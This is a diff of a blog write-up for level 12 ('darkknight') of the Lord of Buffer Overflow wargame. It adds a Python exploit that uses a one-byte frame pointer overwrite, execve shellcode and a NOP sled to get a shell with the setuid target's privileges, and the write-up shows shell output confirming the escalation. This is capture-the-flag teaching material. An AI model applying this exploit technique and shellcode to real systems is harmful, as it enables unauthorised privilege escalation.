@@ -3,7 +3,7 @@ title: "[LOB]Level12. darkknight"
 tags: [LOB, writeup, FPO]
 author: eli_ez3r
 key: 20180830
-modify_date: 2019-10-17
+modify_date: 2019-11-14
 article_header:
   type: cover
   image:
@@ -94,6 +94,10 @@ problem_child의 buffer배열의 시작주소는 `0xbffffc84`로 확인되고 �
 
 -----
 
+&[buffer - 4] : 0xbffffc80
+
+&[buffer + 4] : 0xbffffc88
+
 ### 0x02. Exploit
 
 ```
@@ -109,6 +113,35 @@ uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=5
 bash$ my-pass
 euid = 512
 new attacker
+```
+
+-----
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p8 = lambda x: struct.pack("<B", x)
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/golem/darkknight"
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+buffer_addr = 0xbffffc84
+last_sfp = 0x84 - 4
+
+payload = p32(buffer_addr + 4)
+payload = append("\x90"*(40-4-24))
+payload = append(shellcode)
+payload = append(p8(last_sfp))
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
 ```
 
 -----
